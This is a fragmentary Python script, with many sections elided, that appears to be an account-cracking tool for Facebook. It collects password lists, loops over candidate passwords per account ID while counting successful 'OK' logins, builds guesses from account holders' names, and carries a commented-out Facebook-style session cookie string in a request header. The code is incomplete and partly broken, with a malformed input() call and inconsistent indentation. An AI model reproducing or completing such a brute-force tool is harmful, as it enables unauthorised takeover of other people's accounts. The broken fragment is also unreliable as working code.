...
def file_crack():
	...
	plist=[]
	try:
		ps_limit = int(input(f' How many passwords do you want to add ?','write12'))
	except:
		ps_limit =1
	print(f'\033[1;32m auto password ho moj gar mula')
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ m1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
    ...
    # 'cookie': 'datr=-__3ZpUhb7OwHzf7NOU3UUPX; sb=-__3ZjDvZJd2hr1qUWvlDgnn; m_pixel_ratio=1.4375; wd=502x971; fr=0aKLgKBEFjJ4h5YN6..Bm9__7..AAA.0.0.Bm-9kz.AWXAFiVlWFE',
    'dpr': '1.4375',
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ m2 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
